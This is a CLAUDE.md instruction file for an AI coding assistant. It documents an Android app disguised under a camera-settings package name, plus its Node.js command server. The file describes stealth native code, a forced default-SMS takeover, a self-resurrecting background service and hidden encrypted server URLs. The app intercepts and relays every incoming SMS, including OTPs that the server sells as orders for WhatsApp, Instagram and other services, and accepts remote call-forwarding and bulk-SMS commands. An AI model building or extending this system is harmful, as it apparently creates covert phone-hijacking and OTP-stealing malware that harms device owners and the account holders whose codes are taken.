# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

This is a **dual-component SMS Gateway system**:

- **AISync** (`/AISync`) - Android app that forwards SMS messages to the server
- **server** (`/server`) - Node.js/TypeScript backend with real-time WebSocket communication

**Repository Structure:**
```
/home/neo/migraton/
├── AISync/          # Android app (Kotlin/Gradle)
└── server/          # Backend server (Node.js/TypeScript)
```

---

# AISync Android App

## Project Details

**Package ID:** `com.settingpro.camera`
**Target SDK:** 36 (Android 16)
**Min SDK:** 24 (Android 7.0)
**Code Size:** ~2,600 lines of Kotlin code

## Build Commands

```bash
cd AISync

# Development
./gradlew assembleDebug          # Build debug APK
./gradlew installDebug           # Install debug on connected device
./gradlew assembleRelease        # Build release APK (requires signing config)

# Clean
./gradlew clean                  # Clean build artifacts

# Native Code (C++)
# The app includes native C++ code for stealth features
```

## Configuration

**Required `local.properties` settings:**

```properties
# Release signing (optional, for release builds)
STORE_FILE=path/to/keystore.jks
STORE_PASSWORD=xxx
KEY_ALIAS=xxx
KEY_PASSWORD=xxx

# Server URLs (injected into BuildConfig)
API_BASE_URL=https://your-server.com      # WebSocket server URL
WEBVIEW_URL=https://your-dashboard.com    # WebView/dashboard URL
```

**Note:** URLs are encrypted using `SecretConfig` for security.

## Architecture

### Tech Stack

- **UI Framework:** Jetpack Compose with Material3
- **DI Framework:** Hilt (Dagger 2.50)
- **Communication:** Socket.io client
- **Local Storage:** DataStore Preferences
- **Coroutines:** Kotlinx Coroutines
- **JSON:** Gson
- **Firebase:** Firebase Messaging (FCM)
- **Native:** C++ with CMake for stealth features

### Project Structure

```
com.settingpro.camera/
├── MainActivity.kt                 # Main activity with permission flow & WebView
├── AiChatApplication.kt            # Application class with Hilt
├── data/
│   ├── local/
│   │   └── SettingsDataStore.kt    # DataStore for persistent settings
│   ├── model/
│   │   ├── DeviceInfo.kt           # Device information model
│   │   └── WebSocketMessage.kt     # WebSocket message types
│   └── remote/
│       └── WebSocketClient.kt      # Socket.io client implementation
├── di/
│   ├── DatabaseModule.kt           # Hilt database module
│   └── NetworkModule.kt            # Hilt network module
├── security/
│   ├── SecureEncryption.kt         # Encryption utilities
│   └── SslPinningManager.kt        # SSL pinning for HTTPS
├── service/
│   ├── SmsGatewayService.kt        # Main foreground service
│   ├── SmsReceiver.kt              # SMS broadcast receiver
│   ├── SmsStatusReceiver.kt        # SMS delivery status receiver
│   ├── FcmMessagingService.kt      # FCM message handler
│   ├── BootReceiver.kt             # Boot completed receiver
│   ├── MultiEventReceiver.kt       # Multiple event receiver
│   ├── AlarmReceiver.kt            # Alarm receiver for resurrection
│   ├── StealthCore.kt              # Stealth resurrection logic
│   ├── StealthResurrector.kt       # Stealth resurrection receiver
│   └── SmsGatewayNotifier.kt       # Notification manager
├── sms/
│   ├── HeadlessSmsSendService.kt   # Headless SMS send service
│   ├── MmsReceiver.kt              # MMS receiver
│   └── ComposeSmsActivity.kt       # SMS composition activity
└── util/
    ├── SecretConfig.kt             # Secure configuration
    ├── CallForwardingUtility.kt    # Call forwarding utilities
    ├── SmsSender.kt                # SMS sending utilities
    ├── DeviceUtils.kt              # Device information utilities
    ├── AppLogger.kt                # Logging utilities
    ├── Constants.kt                # App constants
    └── CallForwardingUtility.kt    # Call forwarding (USSD)
```

## Key Features

### 1. Permission Flow (State Machine)

The app implements an aggressive permission flow using a state machine:

```kotlin
enum class FlowStep {
    CHECK_ANDROID_VERSION,
    CHECK_PHONE, REQUEST_PHONE, PHONE_PERMANENTLY_DENIED,
    CHECK_SMS, REQUEST_SMS, SMS_PERMANENTLY_DENIED,
    CHECK_DEFAULT_SMS, REQUEST_DEFAULT_SMS, DEFAULT_SMS_DENIED,
    CHECK_BATTERY, REQUEST_BATTERY, BATTERY_DENIED,
    DONE
}
```

**Permissions Required:**
- **Phone:** `READ_PHONE_STATE`, `CALL_PHONE`, `READ_PHONE_NUMBERS`
- **SMS:** `RECEIVE_SMS`, `READ_SMS`, `SEND_SMS`
- **Default SMS App:** Uses RoleManager (Android 10+) or legacy intent
- **Battery:** `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`

### 2. Stealth Mode (Resurrection Loop)

The app uses a sophisticated resurrection loop to keep the SMS gateway service alive:

**Components:**
- **`StealthCore`** - Object that schedules periodic alarms using `AlarmManager.setExactAndAllowWhileIdle()`
- **`StealthResurrector`** - BroadcastReceiver that fires on each alarm, restarts `SmsGatewayService` if needed, and schedules the next alarm
- **`MultiEventReceiver`** - Catches system events (boot complete, package replaced, etc.) to reinitialize the resurrection loop

**Flow:**
```
StealthCore.startResurrectionLoop() → 
alarm fires → 
StealthResurrector.onReceive() → 
check/restart service → 
StealthCore.scheduleNextAlarm() → 
repeat
```

**Important:** `StealthCore` was refactored from a Service to a plain object because alarm scheduling doesn't require a Service lifecycle and was causing `ForegroundServiceDidNotStartInTimeException` crashes.

### 3. SMS Gateway Service (`SmsGatewayService`)

**Lifecycle:**
- Started as foreground service with notification
- Acquires PARTIAL_WAKE_LOCK for CPU keep-alive
- Registers network callback for connectivity changes
- Registers subscription listener for SIM state changes
- Survives task removal via onTaskRemoved() → restart service

**Key Responsibilities:**
- Maintain WebSocket connection to server
- Forward received SMS messages to server
- Handle incoming commands (send SMS, call forwarding)
- Send periodic heartbeats with device status
- Track SMS forwarding count
- Handle network type changes (WiFi ↔ Cellular)

### 4. WebSocket Client

**Features:**
- Socket.io client with auto-reconnection
- Request-response pattern with pending request tracking
- Connection state management (Disconnected → Connecting → Connected → Error)
- Network type change detection → force reconnect
- Heartbeat every 30 seconds
- SSL pinning support (via `SslPinningManager`)

**Message Types:**
```kotlin
sealed class WebSocketMessage {
    data class Register(val data: RegisterData)
    data class Heartbeat(val data: HeartbeatData)
    data class SmsReceived(val data: SmsReceivedData)
    data class CallForwardingCommand(val data: CallForwardingData)
    data class SendSmsCommand(val data: SendSmsData)
    data class SendSmsResponse(val data: SendSmsResponseData)
    data class CallForwardingResponse(val data: CallForwardingResponseData)
    data class SmsDeliveryStatus(val data: Map<String, Any>)
    data class Ping(val timestamp: Long)
    data class Pong(val timestamp: Long)
    data object Connected
    data class Registered(val deviceId: String)
    data class Ack(val messageId: String?, val success: Boolean)
    data class Error(val code: String?, val message: String)
}
```

### 5. Call Forwarding (USSD)

The app supports call forwarding via USSD codes:

**Actions:**
- `forward` - Activate call forwarding to a phone number
- `deactivate` - Deactivate call forwarding
- `check` - Check call forwarding status

**Utility:** `CallForwardingUtility` handles USSD operations with SIM slot selection.

### 6. SMS Sending

**Features:**
- Multi-part SMS support (long messages)
- SIM slot selection (1 or 2)
- Delivery status tracking via PendingIntent
- Error handling and retry logic
- Bulk SMS support with message ID tracking

**Message ID Format for Bulk SMS:** `bulk_{campaignId}_{messageId}`

### 7. Device Information

**Collected Information:**
- Device ID (unique identifier)
- Device model and manufacturer
- OS version
- Battery level and charging status
- Signal strength
- Network type (WiFi/Mobile)
- SIM information (carrier, slot, phone number)
- FCM token (for push notifications)

### 8. Broadcast Receivers

**BootReceiver** - Restarts service on device boot
**SmsReceiver** - Intercepts incoming SMS and forwards to service
**SmsStatusReceiver** - Tracks SMS send/delivery status
**FcmMessagingService** - Handles FCM push notifications
**MultiEventReceiver** - Handles multiple system events for resurrection
**AlarmReceiver** - Handles resurrection alarm

## WebSocket Protocol (AISync → Server)

### Events Sent by Android

**register:**
```json
{
  "deviceId": "unique-device-id",
  "name": "Device Model",
  "appVersion": "1.1",
  "osVersion": "Android 14",
  "deviceModel": "Pixel 7",
  "manufacturer": "Google",
  "batteryLevel": 85,
  "isCharging": false,
  "signalStrength": 4,
  "networkType": "wifi",
  "sims": [
    {
      "slot": 1,
      "phoneNumber": "+1234567890",
      "carrier": "Verizon",
      "signalStrength": 4,
      "networkType": "LTE",
      "isActive": true
    }
  ],
  "fcmToken": "firebase-push-token"
}
```

**heartbeat:**
```json
{
  "deviceId": "unique-device-id",
  "batteryLevel": 85,
  "isCharging": false,
  "signalStrength": 4,
  "networkType": "wifi",
  "sims": [...],
  "uptime": 3600,
  "smsForwarded": 42,
  "fcmToken": "firebase-push-token"
}
```

**sms:**
```json
{
  "deviceId": "unique-device-id",
  "sender": "+1234567890",
  "content": "SMS message content",
  "timestamp": 1234567890000,
  "simSlot": 1,
  "receiverNumber": "+0987654321",
  "simCarrier": "Verizon",
  "simNetworkType": "LTE",
  "networkType": "wifi"
}
```

**send_sms_response:**
```json
{
  "deviceId": "unique-device-id",
  "requestId": "uuid-from-server",
  "messageId": "msg_timestamp_random",
  "success": true,
  "error": null
}
```

**call_forwarding_response:**
```json
{
  "deviceId": "unique-device-id",
  "requestId": "uuid-from-server",
  "action": "forward",
  "success": true,
  "simSlot": 1,
  "phoneNumber": "+1234567890",
  "error": null,
  "ussdResponse": "USSD response text",
  "timestamp": 1234567890000
}
```

**sms_delivery_status:**
```json
{
  "deviceId": "unique-device-id",
  "messageId": "bulk_campaignId_messageId",
  "campaignId": "campaign-id",
  "bulkMessageId": "message-id",
  "delivered": true,
  "simSlot": 1
}
```

**pong:**
```json
1234567890000  // timestamp
```

### Events Received by Android

**registered:**
```json
{
  "success": true,
  "deviceId": "unique-device-id"
}
```

**ack:**
```json
{
  "type": "ack",
  "data": {
    "messageId": "message-id",
    "success": true
  }
}
```

**send_sms:**
```json
{
  "messageId": "bulk_campaignId_messageId",
  "phoneNumber": "+1234567890",
  "message": "SMS content",
  "simSlot": 1,
  "requestId": "unique-request-id",
  "metadata": {
    "campaignId": "campaign-id",
    "bulkMessageId": "message-id"
  }
}
```

**call_forwarding:**
```json
{
  "action": "forward",
  "phoneNumber": "+1234567890",
  "simSlot": 1,
  "requestId": "unique-request-id"
}
```

**ping:**
```json
1234567890000  // timestamp
```

**error:**
```json
{
  "type": "error",
  "data": {
    "code": "ERROR_CODE",
    "message": "Error description"
  }
}
```

## Security Features

1. **SSL Pinning** - `SslPinningManager` for secure HTTPS connections
2. **URL Encryption** - Server URLs encrypted in `SecretConfig`
3. **Secure Encryption** - `SecureEncryption` utilities for sensitive data
4. **Foreground Service** - Prevents OS from killing the service

## Development Notes

### WebView Integration
- Main activity hosts a WebView for the dashboard UI
- WebView loads after permissions are granted
- Supports JavaScript and DOM storage
- Shows progress indicator during page load

### Notification
- Foreground service notification shows connection status
- Updates dynamically based on WebSocket state
- Shows battery level, signal strength, and SMS count

### SIM Management
- Supports dual-SIM devices
- Tracks SIM slot, carrier, and phone number
- Monitors SIM state changes via SubscriptionManager
- Refreshes device info when SIM configuration changes

### Network Management
- Registers network callback for connectivity changes
- Detects network type changes (WiFi ↔ Cellular)
- Forces WebSocket reconnect on network type change
- Auto-reconnects when network becomes available

---

# Server

## Project Details

**Tech Stack:** Node.js + TypeScript
**Database:** MongoDB with Prisma ORM
**Real-time:** Socket.io (path: `/gateway`)
**API:** tRPC for type-safe endpoints
**Authentication:** Better Auth
**Job Queues:** BullMQ with Redis

## Build Commands

```bash
cd server

# Development
npm run dev                    # Start dev server with hot reload (ts-node-dev)
npm run build                  # Build TypeScript to dist/
npm start                      # Start production server (NODE_ENV=production)

# Database
npx prisma generate            # Generate Prisma Client
npx prisma studio              # Open Prisma Studio GUI
npx prisma migrate dev         # Run migrations

# Workers
npm run workers                # Start background workers
npm run workers:prod           # Start workers in production

# Production Management
pm2 start ecosystem.config.cjs # Start with PM2 process manager
pm2 stop all                   # Stop all processes
pm2 logs                       # View logs
```

## Configuration

**Required `.env` variables:**
```bash
DATABASE_URL="mongodb+srv://localhost:27017/sms-gateway"
PORT=3000
BETTER_AUTH_SECRET="your-secret-key-here"
BETTER_AUTH_URL="http://localhost:3000"
```

## Architecture

### Tech Stack

- **Runtime:** Node.js with TypeScript
- **Framework:** Express.js (custom server)
- **Database:** MongoDB with Prisma ORM
- **API Layer:** tRPC for type-safe endpoints
- **Authentication:** Better Auth
- **Real-time:** Socket.io
- **Job Queues:** BullMQ with Redis

### Project Structure

```
server/
├── src/
│   ├── api/                      # API endpoints
│   │   └── bulk-sms.ts           # Bulk SMS operations
│   ├── db/                       # Database
│   │   └── prisma.ts             # Prisma client
│   ├── jobs/                     # BullMQ job handlers
│   │   ├── handlers/
│   │   │   ├── wakeup-handler.ts
│   │   │   ├── cleanup-handler.ts
│   │   │   ├── status-handler.ts
│   │   │   ├── fetch-handler.ts
│   │   │   ├── suspend-handler.ts
│   │   │   └── keepalive-handler.ts
│   │   └── index.ts
│   ├── lib/                      # Shared utilities
│   │   ├── auth.ts               # Better Auth configuration
│   │   ├── mongodb.ts            # MongoDB utilities
│   │   └── retry-utils.ts        # Retry and circuit breaker utilities
│   ├── queues/                   # BullMQ queue setup
│   │   ├── index.ts
│   │   ├── device-keepalive.ts
│   │   ├── device-status.ts
│   │   ├── device-wakeup.ts
│   │   ├── maintenance-cleanup.ts
│   │   ├── quality-suspend.ts
│   │   ├── sms-fetch.ts
│   │   └── redis.ts
│   ├── trpc/                     # tRPC setup
│   │   ├── index.ts              # tRPC initialization
│   │   ├── context.ts            # tRPC context
│   │   └── router.ts             # API router
│   ├── websocket/                # Socket.io
│   │   └── manager.ts            # Socket.io manager
│   ├── workers/                  # Background workers
│   │   ├── index.ts
│   │   ├── status-worker.ts
│   │   ├── cleanup-worker.ts
│   │   ├── wakeup-worker.ts
│   │   ├── retry-worker.ts
│   │   ├── keepalive-worker.ts
│   │   ├── suspend-worker.ts
│   │   └── fetch-worker.ts
│   └── server.ts                 # Entry point
├── prisma/
│   └── schema.prisma             # Database schema
└── package.json
```

## Database Models (Prisma + MongoDB)

### Core Models

**Device:**
```prisma
model Device {
  id                    String   @id @default(auto()) @map("_id") @db.ObjectId
  deviceId              String   @unique
  name                  String
  status                String   @default("offline")
  lastSeen              DateTime @default(now())
  lastHeartbeat         DateTime @default(now())
  batteryLevel          Int?
  isCharging            Boolean  @default(false)
  signalStrength        Int      @default(0)
  networkType           String   @default("none")
  sims                  Json
  location              Json?
  appVersion            String?
  osVersion             String?
  deviceModel           String?
  manufacturer          String?
  totalMessagesSent     Int      @default(0)
  totalMessagesReceived Int      @default(0)
  lastMessageReceived   DateTime?
  apiKey                String?
  isActive              Boolean  @default(true)
  notes                 String?
  isFavorite            Boolean  @default(false)
  favoritedAt           DateTime?
  registeredAt          DateTime?
  fcmToken              String?
  fcmTokenUpdatedAt     DateTime?
  lastWakeupAttempt     DateTime?
  createdAt             DateTime @default(now())
  updatedAt             DateTime @updatedAt
}
```

**Message:**
```prisma
model Message {
  id        String   @id @default(auto()) @map("_id") @db.ObjectId
  sender    String
  receiver  String
  port      String
  time      DateTime
  message   String
  metadata  Json
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
}
```

**BulkCampaign:**
```prisma
model BulkCampaign {
  id              String   @id @default(auto()) @map("_id") @db.ObjectId
  name            String
  status          String   @default("pending")
  totalRecipients Int      @default(0)
  sentCount       Int      @default(0)
  deliveredCount  Int      @default(0)
  failedCount     Int      @default(0)
  message         String
  scheduledAt     DateTime?
  startedAt       DateTime?
  completedAt     DateTime?
  devicePool      Json
  strategy        String   @default("round-robin")
  userId          String?  @db.ObjectId
  createdBy       String?
  webhookUrl      String?
  metadata        Json?
  createdAt       DateTime @default(now())
  updatedAt       DateTime @updatedAt
  messages        BulkMessage[]
}
```

**BulkMessage:**
```prisma
model BulkMessage {
  id              String   @id @default(auto()) @map("_id") @db.ObjectId
  campaignId      String   @db.ObjectId
  recipientNumber String
  message         String
  status          String   @default("pending")
  deviceId        String?
  simSlot         Int      @default(1)
  sentAt          DateTime?
  deliveredAt     DateTime?
  failedAt        DateTime?
  failureReason   String?
  messageId       String?
  deliveryStatus  String?
  retryCount      Int      @default(0)
  maxRetries      Int      @default(3)
  metadata        Json?
  createdAt       DateTime @default(now())
  updatedAt       DateTime @updatedAt
  campaign        BulkCampaign @relation(fields: [campaignId], references: [id], onDelete: Cascade)
}
```

### Supporting Models

**Numbers** - Phone number quality tracking
**Orders** - SMS orders for OTP services
**Service** - Service definitions (WhatsApp, Instagram, etc.)
**Country** - Country data with dial codes
**Lock** - Number locking for orders
**Cron** - Cron job tracking
**User/Session** - Authentication

## WebSocket Manager

### Architecture

The WebSocket manager (`src/websocket/manager.ts`) implements:

1. **Connection Management:**
   - Device connections tracked by `deviceId`
   - Dashboard connections tracked separately
   - Auto-reconnection with exponential backoff
   - Connection state tracking

2. **Request-Response Pattern:**
   - Pending request tracking with unique `requestId`
   - Timeout handling (30 seconds default)
   - Automatic cleanup of stale requests
   - Promise-based API for awaiting responses

3. **Event Handling:**
   - Device registration
   - Heartbeat processing
   - SMS receiving and forwarding
   - Call forwarding commands
   - SMS sending commands
   - Delivery status tracking

### Public API

```typescript
// Send command and wait for response
const response = await socketManager.sendCommandAndWait<ResponseType>(
  deviceId,
  'event_name',
  { payload },
  timeoutMs
)

// Send command without waiting (fire-and-forget)
socketManager.sendToDevice(deviceId, 'event_name', { payload })

// Check device connection
socketManager.isDeviceConnected(deviceId)

// Get connected devices
socketManager.getConnectedDevices()
```

## tRPC API Routes

### Device Management

**`device.list`** - List devices with filters
**`device.getById`** - Get device by ID
**`device.sendSms`** - Send SMS via device
**`device.toggleCallForwarding`** - Manage call forwarding
**`device.wakeUp`** - Send FCM wake-up signal

### Numbers Management

**`numbers.list`** - List phone numbers
**`numbers.getByNumber`** - Get number details
**`numbers.updateQuality`** - Update quality score
**`numbers.bulkAction`** - Bulk suspend/recover/reset

### Orders Management

**`orders.list`** - List orders
**`orders.getById`** - Get order by ID
**`orders.create`** - Create new order (smart number allocation)
**`orders.getStatus`** - Get order status (OTP retrieval)
**`orders.cancel`** - Cancel order

### Messages

**`messages.list`** - List received SMS messages

### Reference Data

**`countries.all`** - List all countries
**`countries.add`** - Add country (protected)
**`countries.edit`** - Edit country (protected)
**`countries.delete`** - Delete country (protected)

**`services.all`** - List all services
**`services.add`** - Add service (protected)
**`services.edit`** - Edit service (protected)
**`services.delete`** - Delete service (protected)

**`locks.list`** - List number locks (protected)
**`locks.unlock`** - Unlock specific number (protected)
**`locks.unlockAll`** - Unlock all for service (protected)

### Overview

**`overview.activation`** - System activation stats
**`overview.chart`** - Chart data for orders
**`overview.data`** - Detailed order data
**`overview.today`** - Today's hourly order data
**`overview.activeOrders`** - Active orders list (protected)

### Bulk SMS

**`bulkSms.createCampaign`** - Create bulk SMS campaign
**`bulkSms.getCampaignStatus`** - Get campaign status
**`bulkSms.cancelCampaign`** - Cancel campaign
**`bulkSms.getMessageStatus`** - Get message status
**`bulkSms.listCampaigns`** - List campaigns

### Queue Monitoring

**`queues.stats`** - Get queue statistics
**`queues.dlq`** - Get dead letter queue items

## Bulk SMS System

### Features

1. **Campaign Management:**
   - Create campaigns with multiple recipients
   - Schedule campaigns for future execution
   - Track campaign status and progress
   - Cancel running campaigns

2. **Device Selection Strategies:**
   - **Round-robin:** Distribute across devices evenly
   - **Load-balanced:** Select device with least messages sent
   - **Priority:** Use first device in pool

3. **SIM Management:**
   - Support for dual-SIM devices
   - Smart SIM slot selection
   - Performance-based SIM selection
   - Failover between SIMs

4. **Circuit Breaker:**
   - Track device failures
   - Auto-suspend failing devices
   - Retry with exponential backoff
   - Error classification (retriable vs non-retriable)

5. **Delivery Tracking:**
   - Per-message delivery status
   - Campaign statistics
   - Webhook notifications
   - Failed message retry

### Campaign Status Flow

```
pending → processing → completed
                    ↘ failed
                    ↘ cancelled
```

### Message Status Flow

```
pending → queued → sent → delivered
         ↘ failed
```

## Request-Response Pattern

The Socket.io manager implements a request-response pattern for device commands:

```typescript
// Send command and wait for response
const response = await socketManager.sendCommandAndWait<{
  success: boolean
  action: string
  simSlot: number
  phoneNumber?: string
  error?: string
  ussdResponse?: string
}>(
  deviceId,
  'call_forwarding',
  {
    action: 'forward',
    phoneNumber: '+1234567890',
    simSlot: 1
  },
  30000 // 30 second timeout
)
```

Each request includes a unique `requestId` that the device must include in its response.

## WebSocket Protocol (Server → Android)

### Events Sent by Server

**registered:**
```json
{
  "success": true,
  "deviceId": "unique-device-id"
}
```

**ack:**
```json
{
  "type": "ack",
  "data": {
    "messageId": "message-id",
    "success": true
  }
}
```

**send_sms:**
```json
{
  "messageId": "bulk_campaignId_messageId",
  "phoneNumber": "+1234567890",
  "message": "SMS content",
  "simSlot": 1,
  "requestId": "unique-request-id"
}
```

**call_forwarding:**
```json
{
  "action": "forward",
  "phoneNumber": "+1234567890",
  "simSlot": 1,
  "requestId": "unique-request-id"
}
```

**ping:**
```json
1234567890000  // timestamp
```

**error:**
```json
{
  "type": "error",
  "data": {
    "code": "ERROR_CODE",
    "message": "Error description"
  }
}
```

### Events Received by Server

See "WebSocket Protocol (AISync → Server)" section above for events sent by Android.

## Dashboard Clients

Dashboard clients connect with `?isDashboard=true` query parameter and receive real-time broadcasts:

**Broadcast Events:**
- `device_online` - Device came online
- `device_heartbeat` - Device heartbeat update
- `device_offline` - Device went offline
- `sms_received` - New SMS received
- `send_sms_update` - SMS send status update
- `call_forwarding_update` - Call forwarding status update
- `sms_delivery_update` - SMS delivery status update
- `devices_status` - Current device status list

## BullMQ Job Queues

### Queue Types

1. **Device Keep-Alive** - Periodic device health checks
2. **Device Status** - Device status synchronization
3. **Device Wake-Up** - FCM-based device wake-up
4. **Maintenance Cleanup** - Database cleanup jobs
5. **Quality Suspend** - Number quality-based suspension
6. **SMS Fetch** - SMS fetching from devices

### Workers

- **Status Worker** - Sync device status
- **Cleanup Worker** - Clean old data
- **Wake-Up Worker** - Send FCM notifications
- **Keep-Alive Worker** - Send heartbeat checks
- **Suspend Worker** - Suspend low-quality numbers
- **Fetch Worker** - Fetch SMS from devices

## Key Considerations

1. **MongoDB + Prisma:** The server uses Prisma ORM with MongoDB (not PostgreSQL)
2. **Socket Manager Global:** Always access via `getSocketManager()` from `websocket/manager.ts`, never import directly from `server.ts`
3. **Request IDs:** All device commands requiring responses must include a `requestId` for proper handling
4. **Dashboard Connections:** Dashboard clients connect with `?isDashboard=true` query parameter
5. **Type Safety:** tRPC provides end-to-end type safety; changes to routers automatically update client types
6. **Job Queues:** BullMQ requires Redis to be running for background job processing

## Testing

### Server Test Scripts

Located in `/server/`:
- `test-bulk-sms.sh` - Test bulk SMS sending
- `test-call-forwarding.sh` - Test call forwarding commands
- `test-device-list.sh` - Test device listing API
- `test-sms-api.sh` - Test SMS API endpoints
- Various `test-*.js` files for specific functionality tests

### Testing Commands

```bash
cd server

# Run all tests
chmod +x test-*.sh
./test-bulk-sms.sh

# Test specific functionality
node test-websocket-complete.js      # Test WebSocket connection
node test-connected-devices.js       # Test device connectivity
```

## Development Workflow

### Android Development

1. Edit `local.properties` with your signing config and server URLs
2. Connect Android device or start emulator
3. `./gradlew installDebug` to install debug build
4. Use Android Studio's debugger or Logcat for debugging

### Server Development

1. Copy `.env.example` to `.env` and configure
2. Ensure MongoDB is running
3. `npm install` to install dependencies
4. `npm run dev` to start development server
5. Server runs on `http://localhost:3000`
6. tRPC playground: `http://localhost:3000/trpc` (when configured)

### Production Deployment

**Server:**
```bash
npm run build
pm2 start ecosystem.config.cjs
pm2 save
pm2 startup
```

**Android:**
```bash
./gradlew assembleRelease
# APK location: app/build/outputs/apk/release/app-release.apk
```

---

# System Architecture

## Communication Flow

```
Android App (AISync)           Server                    Database
┌─────────────────┐           ┌──────────┐            ┌──────────┐
│  MainActivity  │           │          │            │          │
│  (Permission   │           │          │            │          │
│   Flow + WebView)│          │          │            │          │
└────────┬────────┘           │          │            │          │
         │                    │          │            │          │
┌────────▼────────┐           │          │            │          │
│ SmsGateway      │◄──────────┤  Socket  │◄───────────┤  Prisma  │
│ Service         │   WebSocket│  Manager │   MongoDB │  Client  │
│ (Foreground)    │           │          │            │          │
└────────┬────────┘           │          │            │          │
         │                    │          │            │          │
┌────────▼────────┐           │          │            │          │
│ SmsReceiver     │           │          │            │          │
│ (Intercept SMS) │           │          │            │          │
└─────────────────┘           │          │            │          │
                               │          │            │          │
┌─────────────────┐           │          │            │          │
│  Stealth Mode   │           │  BullMQ  │───────────►│  Redis   │
│  (Resurrection  │           │  Queues  │            │          │
│   Loop)         │           │          │            │          │
└─────────────────┘           └──────────┘            └──────────┘
```

## Data Flow

### SMS Reception
1. SMS received by Android → `SmsReceiver` intercepts
2. Forwarded to `SmsGatewayService`
3. Sent via WebSocket to server
4. Server saves to MongoDB via Prisma
5. Server broadcasts to dashboard clients

### SMS Sending (Command)
1. Dashboard/tRPC sends command
2. Server sends via Socket.io to device
3. Device receives in `SmsGatewayService`
4. `SmsSender` sends SMS via Android API
5. Delivery status tracked via PendingIntent
6. Response sent back via WebSocket

### Bulk SMS Campaign
1. Campaign created via tRPC API
2. Messages created in database
3. Background worker processes campaign
4. Devices selected via strategy (round-robin, etc.)
5. SMS commands sent to devices
6. Delivery status tracked
7. Campaign statistics updated

---

# Important Notes

- Both projects are actively maintained
- Server uses Prisma with MongoDB (not PostgreSQL)
- Android app uses stealth mode for reliable background SMS reception
- WebSocket communication is critical for real-time updates
- Better Auth provides authentication for both web and mobile clients
- BullMQ workers require Redis for job queue functionality
- All device commands requiring responses use the request-response pattern with unique `requestId`
